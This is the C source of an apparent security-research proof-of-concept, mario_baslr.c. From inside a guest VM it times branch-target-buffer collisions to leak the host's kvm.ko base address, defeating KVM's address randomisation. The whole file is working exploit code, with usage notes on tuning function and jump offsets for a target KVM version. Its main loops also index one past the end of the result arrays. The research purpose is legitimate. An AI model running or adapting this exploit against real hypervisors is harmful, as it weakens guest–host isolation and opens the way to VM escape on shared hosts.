/*
mario_baslr.c
Felix Wilhelm [fwilhelm@ernw.de]

Leaks kvm.ko base address from a guest VM
using time delays created by branch target buffer
collisions.

Usage:
- change function + jump offsets for kvm_cpuid and kvm_emulate_hypercall
to the correct values for the KVM version of your target.
(todo: version fingerprinting)
- compile with gcc -O2 (!)
- if base address does not show up after a few tries increase MAX_SEARCH_ADDRESS
  or NUM_RESULTS

See github.com/felixwilhelm/mario_baslr/ for more info.
*/

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#define NUM_RESULTS 8

#define MAX_SEARCH_ADDRESS 0xfc09f0000

void cpuid(int code) {
  asm volatile("cpuid" : : "a"(code) : "ebx", "ecx", "edx");
}

uint64_t rdtsc() {
  uint32_t high, low;
  asm volatile(".att_syntax\n\t"
               "RDTSCP\n\t"
               : "=a"(low), "=d"(high)::);
  return ((uint64_t)high << 32) | low;
}

uint64_t time_function(void (*funcptr)()) {
  uint64_t start;
  for (int i = 0; i < 50; i++) {
    funcptr();
  }
  asm volatile("vmcall" : : : "eax");
  cpuid(0);
  start = rdtsc();
  funcptr();
  uint64_t end = rdtsc();
  cpuid(0);
  return end - start;
}

void jump(void) {
  asm volatile("jmp target\n\t"
               "nop\n\t"
               "nop\n\t"
               "target:nop\n\t"
               "nop\n\t");
}

uint64_t move_and_time(uint64_t addr) {
  void *mapped = mmap((void *)addr, 2048, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
  memcpy((void *)addr, jump, 512);
  uint64_t res = 0;
  for (int i = 0; i < 50; i++) {
    res += time_function((void *)addr);
  }
  munmap(mapped, 2048);
  return res / 50;
}

typedef struct _testcase {
  const char *function_name;
  uint32_t function_offset;
  uint16_t jump_offsets[4];
} testcase;

typedef struct _result {
  uint64_t timing;
  uint64_t address;
} result;

int cmp(const void *a, const void *b) {
  uint64_t ta = ((result *)a)->timing;
  uint64_t tb = ((result *)b)->timing;
  if (ta < tb)
    return -1;
  else if (ta > tb)
    return 1;
  return 0;
}

void search_module_base(testcase *t, result *results) {
  uint64_t low = 0xfc0000000 + t->function_offset;
  uint64_t high = MAX_SEARCH_ADDRESS;

  memset(results, 0, sizeof(result) * NUM_RESULTS);

  uint64_t sum = 0, count = 0;
  for (uint64_t c = low; c <= high; c += 0x1000) {
    sum += move_and_time(c);
    count++;
  }

  uint64_t average = sum / count;

  for (uint64_t c = low; c <= high; c += 0x1000) {
    uint64_t timing = 0;
    for (int i = 0; i < 4; i++) {
      timing += move_and_time(c + t->jump_offsets[i]);
    }

    if (timing > (average * 8)) {
      printf("[!] skipping outlier @ %lx : %ld\n", c, timing);
      continue;
    }

    if (timing > results[0].timing) {
      // printf("[.] new candidate @ %lx : %ld\n", c, timing);
      results[0].timing = timing;
      results[0].address = c;
      qsort(results, NUM_RESULTS, sizeof(result), cmp);
    }
  }
}

testcase kvm_cpuid = {.function_name = "kvm_cpuid",
                      .function_offset = 0x3ead0,
                      .jump_offsets = {0, 50, 69, 144}};

testcase kvm_emulate_hypercall = {
    .function_name = "kvm_emulate_hypercall",
    .function_offset = 0xf650,
    .jump_offsets = {0, 47, 56, 66},
};

int main(int argc, char **argv) {
  result r[NUM_RESULTS], r2[NUM_RESULTS];

  search_module_base(&kvm_cpuid, r);
  search_module_base(&kvm_emulate_hypercall, r2);

  int hit = 0;

  for (int i = NUM_RESULTS; i >= 0; i--) {
    result a = r[i];
    for (int j = NUM_RESULTS; j >= 0; j--) {
      result b = r2[j];
      if (a.address - b.address ==
          kvm_cpuid.function_offset - kvm_emulate_hypercall.function_offset) {
        printf("[x] potential hit @ %lx : %lx\n", a.address, b.address);
        printf("[x] kvm_cpuid @ %lx\n", 0xffffffff00000000 | a.address);
        printf("[x] kvm_emulate_hypercall @ %lx\n",
               0xffffffff00000000 | b.address);
        printf("[x] potential kvm.ko base address @ %lx\n",
               0xffffffff00000000 | (a.address - kvm_cpuid.function_offset));
        hit = 1;
      }
    }
  }

  if (!hit) {
    printf("[!] Did not find a possible match :(\n[!] If you are sure your "
           "offsets are correct try again.\n");
  }
}
